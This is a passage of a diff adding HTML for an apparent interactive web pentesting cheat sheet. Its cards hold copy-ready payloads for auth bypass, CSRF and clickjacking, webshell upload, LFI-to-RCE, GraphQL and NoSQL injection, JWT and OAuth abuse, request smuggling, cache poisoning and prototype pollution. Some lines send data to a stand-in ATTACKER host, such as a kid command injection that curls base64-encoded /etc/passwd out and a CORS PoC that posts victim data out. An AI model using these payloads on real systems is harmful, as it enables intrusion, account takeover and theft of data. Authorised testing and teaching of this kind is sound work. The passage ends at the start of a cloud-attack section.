+<div class="card" data-sev="high" data-id="id2">
+  <div class="card-hd"><span class="ctitle">Header-Based Auth Bypass</span><div class="card-prog"><button class="cp-btn" onclick="markCard('id2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('id2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('id2','na',this)">N/A</button></div><span class="sev sh">BYPASS</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Host: localhost
+X-HTTP-Method-Override: GET
+# Path tricks
+/ADMIN  /admin/  /%61dmin  /admin%20</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="id3">
+  <div class="card-hd"><span class="ctitle">Mass Assignment + PrivEsc</span><div class="card-prog"><button class="cp-btn" onclick="markCard('id3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('id3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('id3','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">{"username":"hacker","password":"pass","role":"admin","credit":999999}
+{"name":"Hacker","isVerified":true,"balance":100000}
+# Cookie manipulation
+role=user → role=admin
+isadmin=0 → isadmin=1</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ CSRF ░░ -->
+<div id="sec-csrf" class="section">
+<div class="shdr"><div class="sico">🔁</div><div><div class="stitle">CSRF / CLICKJACKING</div><div class="sdesc">// CSRF token bypass — JSON CSRF — SameSite — UI redress attacks</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Find State-Change</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Check Token</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Bypass Token</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Build PoC</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Test SameSite</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Deliver</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="high" data-id="cs1">
+  <div class="card-hd"><span class="ctitle">CSRF PoC + JSON CSRF</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cs1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cs1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cs1','na',this)">N/A</button></div><span class="sev sh">CSRF</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">&lt;html&gt;&lt;body onload="document.getElementById('f').submit()"&gt;
+&lt;form id="f" method="POST" action="https://TARGET/api/change-email"&gt;
+  &lt;input type="hidden" name="email" value="<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2b434a48404e596b4e5d424705484446">[email&#160;protected]</a>"&gt;
+&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</div>
+<div class="cglbl">JSON CSRF (text/plain bypass)</div>
+<div class="payload" onclick="cp(this)">&lt;form method="post" action="https://TARGET/api/update" enctype="text/plain"&gt;
+  &lt;input name='{"email":"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5931383a323c2b193c2f3035773a3634">[email&#160;protected]</a>","x":"' value='"}'&gt;
+&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</div>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="cs2">
+  <div class="card-hd"><span class="ctitle">Token Bypass + Clickjacking</span><div class="card-prog"><button class="cp-btn" onclick="markCard('cs2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('cs2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('cs2','na',this)">N/A</button></div><span class="sev sh">BYPASS</span></div>
+  <div class="card-bd">
+<ul class="cl">
+<li>Remove token entirely — still works?</li>
+<li>Use token from your own session (not session-tied?)</li>
+<li>Change POST→GET — token checked on GET?</li>
+<li>SameSite=None without Secure flag?</li>
+<li>JSON Content-Type → text/plain bypass</li>
+</ul>
+<div class="cglbl">Clickjacking PoC</div>
+<div class="payload" onclick="cp(this)">&lt;style&gt;iframe{opacity:.0001;position:absolute;top:0;left:0;width:100%;height:100%}&lt;/style&gt;
+&lt;button style="position:absolute;top:300px;left:200px"&gt;Click for prize!&lt;/button&gt;
+&lt;iframe src="https://TARGET/delete-account"&gt;&lt;/iframe&gt;</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ UPLOAD ░░ -->
+<div id="sec-upload" class="section">
+<div class="shdr"><div class="sico">📤</div><div><div class="stitle">FILE UPLOAD / PATH TRAVERSAL</div><div class="sdesc">// webshell upload — LFI — log poisoning — zip slip — PHP wrappers</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Find Upload</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Bypass Filters</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Upload Webshell</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">LFI Discovery</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">LFI → RCE</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Reverse Shell</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="up1">
+  <div class="card-hd"><span class="ctitle">Webshell Upload Bypass</span><div class="card-prog"><button class="cp-btn" onclick="markCard('up1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('up1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('up1','na',this)">N/A</button></div><span class="sev sc">UPLOAD</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">shell.php.jpg   shell.php%00.jpg   shell.PHP
+shell.php5   shell.phtml   shell.phar
+# Content-Type: image/jpeg  (still .php body)
+# Magic bytes prepend:
+GIF89a;&lt;?php system($_GET['cmd']); ?&gt;
+# Alt extensions:
+.asa .cer .aspx (ASP)   .jspx .jspf (JSP)</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="up2">
+  <div class="card-hd"><span class="ctitle">Path Traversal / LFI</span><div class="card-prog"><button class="cp-btn" onclick="markCard('up2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('up2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('up2','na',this)">N/A</button></div><span class="sev sc">LFI</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252fetc%252fpasswd
+/proc/self/environ
+/var/log/apache2/access.log
+/home/user/.ssh/id_rsa</div>
+<div class="cglbl">LFI → RCE (PHP Wrappers)</div>
+<div class="payload" onclick="cp(this)">php://filter/convert.base64-encode/resource=/etc/passwd
+php://input  (POST: &lt;?php system($_GET[0]);?&gt;)
+data://text/plain,&lt;?php system($_GET[0])?&gt;
+# Log poisoning: inject PHP in User-Agent, include log</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ REST API ░░ -->
+<div id="sec-api" class="section">
+<div class="shdr"><div class="sico">🔌</div><div><div class="stitle">REST API TESTING</div><div class="sdesc">// OWASP API Top 10 — auth — rate limiting — race conditions — versioning</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Discover Endpoints</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Map Auth Model</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">BOLA Testing</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Rate Limit Bypass</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Mass Assignment</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Race Conditions</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="info" data-id="api1">
+  <div class="card-hd"><span class="ctitle">API Discovery</span><div class="card-prog"><button class="cp-btn" onclick="markCard('api1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('api1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('api1','na',this)">N/A</button></div><span class="sev si">RECON</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">ffuf -u https://api.TARGET/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,400,401,403</div>
+<div class="cmd" onclick="cp(this)">kiterunner scan https://TARGET -w /opt/routes-large.kite -x 20</div>
+<div class="note">Check: /swagger.json /openapi.yaml /api-docs /v2/api-docs /graphql /.well-known/</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="api2">
+  <div class="card-hd"><span class="ctitle">OWASP API Top 10 Checklist</span><div class="card-prog"><button class="cp-btn" onclick="markCard('api2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('api2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('api2','na',this)">N/A</button></div><span class="sev sc">CHECKLIST</span></div>
+  <div class="card-bd">
+<table class="dtbl">
+<thead><tr><th>#</th><th>Vulnerability</th></tr></thead>
+<tbody>
+<tr><td class="red">API1</td><td>Broken Object Level Auth (BOLA)</td></tr>
+<tr><td class="red">API2</td><td>Broken Authentication</td></tr>
+<tr><td class="orange">API3</td><td>Broken Object Property Level Auth</td></tr>
+<tr><td class="orange">API4</td><td>Unrestricted Resource Consumption</td></tr>
+<tr><td class="red">API5</td><td>Broken Function Level Authorization</td></tr>
+<tr><td class="orange">API6</td><td>Unrestricted Sensitive Business Flows</td></tr>
+<tr><td class="orange">API7</td><td>Server Side Request Forgery</td></tr>
+<tr><td class="red">API8</td><td>Security Misconfiguration</td></tr>
+<tr><td class="orange">API9</td><td>Improper Inventory Management</td></tr>
+<tr><td class="red">API10</td><td>Unsafe Consumption of APIs</td></tr>
+</tbody>
+</table>
+  </div>
+</div>
+<div class="card" data-sev="high" data-id="api3">
+  <div class="card-hd"><span class="ctitle">Rate Limit Bypass + Race Conditions</span><div class="card-prog"><button class="cp-btn" onclick="markCard('api3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('api3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('api3','na',this)">N/A</button></div><span class="sev sh">HIGH</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">X-Forwarded-For: 1.2.3.X    (rotate per request)
+X-Real-IP: 1.2.3.X
+# Email variations
+{"email": "victim@TARGET\0"}
+{"email": "v.ictim@TARGET"}
+{"email": "victim+1@TARGET"}
+# Race condition: send 20 identical requests simultaneously
+# Targets: coupon, OTP, balance, prize, registration</div>
+<div class="note">Burp: Group tabs → Send group (parallel). Or use Turbo Intruder race_single_packet.py</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ GRAPHQL ░░ -->
+<div id="sec-graphql" class="section">
+<div class="shdr"><div class="sico">🕸️</div><div><div class="stitle">GRAPHQL ATTACKS</div><div class="sdesc">// introspection — BOLA — injection — batching — depth DoS — bypass</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Detect GQL</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Introspection</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Schema Map</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">BOLA Test</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Injection</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">DoS / Batching</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="info" data-id="gq1">
+  <div class="card-hd"><span class="ctitle">Introspection + Enum</span><div class="card-prog"><button class="cp-btn" onclick="markCard('gq1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('gq1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('gq1','na',this)">N/A</button></div><span class="sev si">GRAPHQL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">{"query": "{__schema{queryType{name}types{kind name fields{name type{name}}}}}"}
+{"query": "{__schema{types{name}}}"}
+GET /graphql?query={__schema{types{name}}}</div>
+<div class="cmd" onclick="cp(this)">graphw00f -f -t https://TARGET/graphql</div>
+<div class="cmd" onclick="cp(this)">clairvoyance -u https://TARGET/graphql -o schema.json</div>
+<div class="cmd" onclick="cp(this)">inql scan -t https://TARGET/graphql</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="gq2">
+  <div class="card-hd"><span class="ctitle">BOLA + Injection + Batching DoS</span><div class="card-prog"><button class="cp-btn" onclick="markCard('gq2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('gq2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('gq2','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># BOLA
+query { user(id: "VICTIM_ID") { email password apiKey } }
+# SQLi in argument
+query { user(id: "1 OR 1=1") { email } }
+# NoSQLi
+query { login(user: "admin", pass: {"$gt": ""}) { token } }
+# Batch brute force (bypass rate limit)
+[{"query":"mutation{login(user:\"admin\",pass:\"FUZZ\"){token}}"},...]
+# Depth bomb DoS
+query { user { friends { friends { friends { id } } } } }</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ JWT ░░ -->
+<div id="sec-jwt" class="section">
+<div class="shdr"><div class="sico">🔑</div><div><div class="stitle">JWT / AUTHENTICATION BYPASS</div><div class="sdesc">// none alg — alg confusion — kid injection — OAuth — SAML</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Decode Token</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">None Alg</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Crack Secret</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Alg Confusion</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Header Inject</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">OAuth Abuse</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="critical" data-id="jw1">
+  <div class="card-hd"><span class="ctitle">None Alg + Crack + Confusion</span><div class="card-prog"><button class="cp-btn" onclick="markCard('jw1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('jw1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('jw1','na',this)">N/A</button></div><span class="sev sc">JWT</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># None algorithm: set alg="none", remove signature
+# header.payload.   (trailing dot, empty sig)
+# Brute force weak secret
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt</div>
+<div class="cmd" onclick="cp(this)">python3 jwt_tool.py JWT_TOKEN -X a</div>
+<div class="cmd" onclick="cp(this)">python3 jwt_tool.py JWT_TOKEN -X k -pk public.pem</div>
+<div class="cmd" onclick="cp(this)">python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="jw2">
+  <div class="card-hd"><span class="ctitle">kid / jku Header Injection</span><div class="card-prog"><button class="cp-btn" onclick="markCard('jw2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('jw2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('jw2','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># jku injection — attacker-hosted JWKS
+{"alg":"RS256","jku":"https://ATTACKER/evil.jwks","kid":"key"}
+# kid path traversal — sign with empty string
+{"kid": "../../dev/null"}
+# kid SQL injection
+{"kid": "' UNION SELECT 'attackersecret' -- -"}
+# kid command injection
+{"kid": "key'|curl http://ATTACKER/$(cat /etc/passwd|base64)"}</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="jw3">
+  <div class="card-hd"><span class="ctitle">OAuth / SAML Attacks</span><div class="card-prog"><button class="cp-btn" onclick="markCard('jw3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('jw3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('jw3','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Redirect URI manipulation
+redirect_uri=https://ATTACKER/callback
+redirect_uri=https://legit.com@ATTACKER
+redirect_uri=https://legit.com%2F%2FATTACKER
+# Missing state = CSRF on OAuth flow
+# PKCE downgrade: remove code_challenge
+# SAML: strip Signature node from assertion
+# XSW: wrap valid signed content around malicious assertion</div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ ADVANCED ░░ -->
+<div id="sec-adv" class="section">
+<div class="shdr"><div class="sico">☠️</div><div><div class="stitle">ADVANCED TECHNIQUES</div><div class="sdesc">// HTTP smuggling — cache poisoning — prototype pollution — CORS — NoSQL — CRLF</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Smuggling</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Cache Poison</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Proto Pollution</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">CORS Abuse</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">NoSQLi</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Chain Exploits</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="advanced" data-id="adv1">
+  <div class="card-hd"><span class="ctitle">HTTP Request Smuggling</span><div class="card-prog"><button class="cp-btn" onclick="markCard('adv1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('adv1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('adv1','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># CL.TE
+POST / HTTP/1.1
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+# TE.CL
+POST / HTTP/1.1
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0</div>
+<div class="cmd" onclick="cp(this)">python3 smuggler.py -u https://TARGET</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="adv2">
+  <div class="card-hd"><span class="ctitle">Web Cache Poisoning</span><div class="card-prog"><button class="cp-btn" onclick="markCard('adv2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('adv2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('adv2','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Find unkeyed headers (reflected but not part of cache key)
+X-Forwarded-Host: ATTACKER
+X-Host: ATTACKER
+# Cache deception
+GET /profile/..%2Fcached.js
+# Param cloaking
+GET /js/app.js?ev=||alert(1)</div>
+<div class="note">Burp Param Miner extension finds unkeyed inputs automatically.</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="adv3">
+  <div class="card-hd"><span class="ctitle">Prototype Pollution</span><div class="card-prog"><button class="cp-btn" onclick="markCard('adv3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('adv3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('adv3','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Client-side URL
+?__proto__[isAdmin]=true
+?constructor[prototype][isAdmin]=true
+# Server-side Node.js RCE
+{"__proto__": {"shell":"node","NODE_OPTIONS":"--inspect=ATTACKER:PORT"}}
+# AST injection (lodash)
+{"__proto__": {"sourceURL": "\nreturn process.mainModule.require('child_process').execSync('id')\n"}}</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="adv4">
+  <div class="card-hd"><span class="ctitle">CORS Misconfiguration</span><div class="card-prog"><button class="cp-btn" onclick="markCard('adv4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('adv4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('adv4','na',this)">N/A</button></div><span class="sev sa">ADVANCED</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">Origin: null
+Origin: https://TARGET.ATTACKER.com
+Origin: https://ATTACKERTARGET.com
+# PoC
+fetch('https://api.TARGET/user',{credentials:'include'})
+  .then(r=&gt;r.json())
+  .then(d=&gt;fetch('https://ATTACKER/?d='+JSON.stringify(d)))</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="adv5">
+  <div class="card-hd"><span class="ctitle">NoSQL Injection</span><div class="card-prog"><button class="cp-btn" onclick="markCard('adv5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('adv5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('adv5','na',this)">N/A</button></div><span class="sev sc">CRITICAL</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
+?user[$ne]=x&amp;pass[$ne]=x
+# Blind extraction via regex
+{"username": {"$regex": "^a"}, "password": {"$ne": ""}}</div>
+  </div>
+</div>
+<div class="card" data-sev="advanced" data-id="adv6">
+  <div class="card-hd"><span class="ctitle">Exploit Chains</span><div class="card-prog"><button class="cp-btn" onclick="markCard('adv6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('adv6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('adv6','na',this)">N/A</button></div><span class="sev sa">CHAINS</span></div>
+  <div class="card-bd">
+<div class="chain"><div class="cs blue">Open Redirect</div><div class="ca">→</div><div class="cs purple">OAuth code steal</div><div class="ca">→</div><div class="cs red">Account takeover</div></div>
+<div class="chain" style="margin-top:5px;"><div class="cs blue">Self-XSS</div><div class="ca">+</div><div class="cs purple">CSRF</div><div class="ca">→</div><div class="cs red">Stored XSS on victim</div></div>
+<div class="chain" style="margin-top:5px;"><div class="cs blue">Subdomain takeover</div><div class="ca">→</div><div class="cs purple">CORS bypass</div><div class="ca">→</div><div class="cs red">API exfil</div></div>
+<div class="chain" style="margin-top:5px;"><div class="cs blue">SSRF</div><div class="ca">→</div><div class="cs purple">IMDSv1</div><div class="ca">→</div><div class="cs red">Cloud takeover</div></div>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- ░░ CLOUD ░░ -->
+<div id="sec-cloud" class="section">
+<div class="shdr"><div class="sico">☁️</div><div><div class="stitle">CLOUD ATTACKS</div><div class="sdesc">// AWS — GCP — Azure — S3 misconfigs — IAM enumeration — Lambda — metadata abuse</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
